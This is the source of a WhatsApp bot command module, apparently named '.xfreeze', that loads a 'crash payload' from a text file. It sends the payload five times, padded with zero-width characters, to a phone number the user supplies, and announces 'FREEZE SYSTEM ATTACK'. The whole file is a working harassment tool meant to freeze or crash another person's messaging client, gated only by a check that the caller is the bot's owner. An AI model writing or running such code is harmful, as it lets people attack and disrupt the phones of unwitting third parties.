const fs = require("fs");
const path = require("path");

// 🔢 Clean number from JID
function getCleanNumber(jid) {
  return jid ? jid.replace(/\D/g, "") : null;
}

// 🔍 Identify sender
function resolveSenderNumber(m, conn) {
  let senderJid =
    m.key?.participant ||
    m.participant ||
    m.message?.extendedTextMessage?.contextInfo?.participant ||
    m.sender ||
    (m.key?.fromMe && conn?.user?.id) ||
    m.key?.remoteJid;

  if (!senderJid && conn?.decodeJid) {
    try {
      senderJid = conn.decodeJid(m?.key?.remoteJid);
    } catch {
      senderJid = null;
    }
  }

  return getCleanNumber(senderJid);
}

module.exports = async function ({ conn, m, args, reply, jid }) {
  try {
    const senderNum = resolveSenderNumber(m, conn);
    if (!senderNum) return reply("❌ Unable to identify the sender.");

    // ✅ Correct file path for same-level media/ folder
    const configPath = path.join(__dirname, "media/selfmode.json");

    if (!fs.existsSync(configPath)) {
      return reply("⚠️ *Bot is inactive.* Please ask the owner to use `.self` to activate it.\n\n> 𝐋 𝐔 𝐂 𝐈 𝐅 𝐄 𝐑 ❦ ✓");
    }

    let jsonData;
    try {
      jsonData = JSON.parse(fs.readFileSync(configPath));
    } catch {
      return reply("❌ Error reading `selfmode.json`. File is corrupted or empty.");
    }

    const realOwner = jsonData.owner_sender;
    if (senderNum !== realOwner) {
      return reply("🚫 *Access Denied!*\n\nOnly the *bot owner* can use `.xfreeze` command.\n\n> 𝐋 𝐔 𝐂 𝐈 𝐅 𝐄 𝐑 ❦ ✓");
    }

    // 🎯 Validate target number
    if (!args[0]) return reply("❌ Please provide a target number.\nExample: `.xfreeze 923xxxxxxxxx`");
    const targetNum = args[0].replace(/\D/g, "");
    if (!targetNum.match(/^\d{9,15}$/)) return reply("❌ Invalid number format.");

    const targetJid = targetNum + "@s.whatsapp.net";

    // 📂 Load crash payload
    let unicode;
    try {
      unicode = fs.readFileSync("media/tayyabtext2.txt", "utf-8");
    } catch {
      return reply("❌ Crash payload file missing: `media/tayyabtext2.txt`");
    }

    const payload = "💥 *FREEZE SYSTEM ATTACK*\n\n🧊\u200C\u200B\u200D\n\n" + unicode.repeat(1);
    const sendCount = 5;

    for (let i = 0; i < sendCount; i++) {
      try {
        await conn.sendMessage(targetJid, { text: payload }, { quoted: m });
        await new Promise(res => setTimeout(res, 1500));
      } catch {
        return reply(`❌ Failed to send freeze payload to ${targetNum} (Attempt ${i + 1})`);
      }
    }

    return reply(`✅ *XFREEZE attack launched on:* ${targetNum}\n\n> 𝐋 𝐔 𝐂 𝐈 𝐅 𝐄 𝐑 ❦ ✓`);

  } catch (err) {
    console.error("[❌ ERROR in xfreeze]:", err);
    return reply("❌ Something went wrong while executing `.xfreeze`.\n\n> 𝐋 𝐔 𝐂 𝐈 𝐅 𝐄 𝐑 ❦ ✓");
  }
};